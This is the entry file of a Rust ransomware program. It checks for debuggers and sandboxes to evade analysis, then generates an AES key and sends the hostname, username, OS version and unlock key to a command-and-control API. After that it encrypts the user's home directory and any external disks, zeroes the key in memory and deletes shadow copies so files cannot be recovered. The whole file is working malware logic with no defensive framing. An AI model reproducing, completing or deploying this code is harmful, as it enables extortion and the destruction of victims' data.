mod c2;
mod encryption;
mod system;
use serde_json::json;
use std::{env, process::exit};

#[tokio::main]
async fn main() {
    /* println!("{}", system::info::get_user_home().display());
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("Missing Arguments");
        exit(-1)
    } */

    if !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected() {
        let mut key = encryption::file::gen_aes_key(32);

        let c2 = c2::api::C2API::new();
        let body = json!({
            "versionOS": system::info::get_version(),
            "host": system::info::get_hostname(),
            "hookUser": system::info::get_username(),
            "unlockKey": key
        });

        let api_res = c2.post(&body, "agent/new").await;
        if api_res["data"] == json!({}) {
            println!("Error: {}", api_res["error"]["errorMsg"])
        }
        println!("{}", api_res["data"]);

        encryption::file::multi_threaded_encrypt_decrypt_files(
            //    &args[1][..],
            system::info::get_user_home().to_str().unwrap(),
            key.as_bytes(),
            api_res["data"]["id"].to_string(),
        );
        encryption::disk::encrypt_decrypt_external_disks(
            key.as_bytes(),
            api_res["data"]["id"].to_string(),
        );

        unsafe {
            for key_char in key.as_mut_vec() {
                *key_char = 48;
            }
        }
        //println!("{}", key);

        system::file::delete_shadow_copies();
    }

    exit(0);
}
